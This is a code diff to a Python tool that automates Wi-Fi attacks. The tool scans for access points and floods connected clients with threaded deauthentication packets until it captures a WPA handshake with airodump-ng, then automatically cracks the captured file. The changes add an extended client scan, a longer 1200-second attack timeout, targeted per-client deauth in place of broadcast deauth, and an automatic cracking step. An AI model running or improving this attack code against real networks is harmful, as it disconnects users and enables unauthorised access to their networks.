@@ -15,21 +15,32 @@ from scan_parser import parse_scan, choose_ap_by_name, choose_strongest_ap
 from scan_for_handshake import check_handshake, deauthenthicate, start_airodump_and_watch
 from crack import crack_cap
 
-def delete_scan_files(prefix: Path):
-    prefix = prefix.with_suffix("") 
-    suffixes = ["-01.csv", "-01.cap"]
-
-    for suf in suffixes:
-        f = Path(str(prefix) + suf)
-        if f.exists():
+def delete_scan_files(directory: Path = None):
+    if directory is None:
+        directory = Path(__file__).resolve().parent
+    
+    patterns = [
+        "handshake*.cap",
+        "handshake*.csv", 
+        "scan_*.csv",
+        "scan_*.cap",
+        "extended_scan*.csv",
+        "extended_scan*.cap",
+        "rescan_*.csv",
+        "rescan_*.cap",
+    ]
+    
+    for pattern in patterns:
+        for f in directory.glob(pattern):
             try:
                 os.remove(f)
-            except Exception:
-                pass
+                print(f"Deleted old file: {f.name}")
+            except Exception as e:
+                print(f"Failed to delete {f.name}: {e}")
 
 def run(interactive: bool = True, iface: str | None = None, duration: int = 8, out_prefix: str | None = None, confirm: bool = True):
 
-	delete_scan_files(Path(__file__).resolve())
+	delete_scan_files()
 
 	if interactive:
 		chosen = set_interfaces()
@@ -104,35 +115,55 @@ def run(interactive: bool = True, iface: str | None = None, duration: int = 8, o
 		t = threading.Thread(target=airodump_thread, daemon=True)
 		t.start()
 
-		timeout = 300
+		print("Waiting for airodump-ng to start capturing...")
+		time.sleep(5)
+
+		timeout = 1200
 		start_time = time.time()
 
 		try:
 			clients = [s.get('station') for s in stations if s.get('bssid') == focus.get('bssid') and s.get('station')]
+			
 			if not clients:
-				print('No connected clients found in initial scan; proceeding with broadcast deauths')
+				print('No connected clients found in initial scan.')
+				print(f'Starting extended scan on channel {focus["channel"]} to find clients...')
+				
+				extended_csv = scan_once(iface_to_use, duration=30, out_prefix="extended_scan")
+				if extended_csv:
+					try:
+						extended_parsed = parse_scan(extended_csv)
+						extended_stations = extended_parsed.get('stations', [])
+						clients = [s.get('station') for s in extended_stations if s.get('bssid') == focus.get('bssid') and s.get('station')]
+						try:
+							os.remove(extended_csv)
+						except:
+							pass
+					except Exception as e:
+						print(f'Extended scan parse error: {e}')
+
+			if not clients:
+				print('No connected clients found even after extended scan. Cannot capture handshake.')
+				print('Try again later when devices are connected to the network.')
+				stop_event.set()
+				return 1
+
+			print(f'Found {len(clients)} client(s) connected to AP. Starting deauth attack...')
 
 			burst_interval = 1  
 
-			max_workers = max(4, len(clients) if clients else 4)
+			max_workers = max(4, len(clients))
+			
 			with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as exe:
 				while not ok and (time.time() - start_time) < timeout and not stop_event.is_set():
 					futures = []
 
-					if clients:
-						for client in clients:
-							if stop_event.is_set():
-								break
-							futures.append(exe.submit(deauthenthicate, focus['bssid'], client, iface_to_use, 50))
-					else:
-						for i in range(10):
-							if stop_event.is_set():
-								break
-							futures.append(exe.submit(deauthenthicate, focus['bssid'], None, iface_to_use, 50))
+					for client in clients:
+						if stop_event.is_set():
+							break
+						futures.append(exe.submit(deauthenthicate, focus['bssid'], client, iface_to_use, 50))
 
 					if not futures:
-						time.sleep(burst_interval)
-						continue
+						break
 
 					for future in concurrent.futures.as_completed(futures, timeout=180):
 						if stop_event.is_set():
@@ -212,6 +243,18 @@ def run(interactive: bool = True, iface: str | None = None, duration: int = 8, o
 							pass
 			except Exception:
 				pass
+
+		if not ok and result.get("handshake_detected"):
+			cap_path = result.get("cap_path")
+			if cap_path and check_handshake(cap_path):
+				print("Handshake confirmed. Starting crack...")
+				ok = True
+				try:
+					crack_cap(cap_path)
+				except Exception as e:
+					print(f"Error occurred while cracking .cap file: {e}")
+			else:
+				print("Handshake was detected but cap file not valid.")
 
 	return 0
 
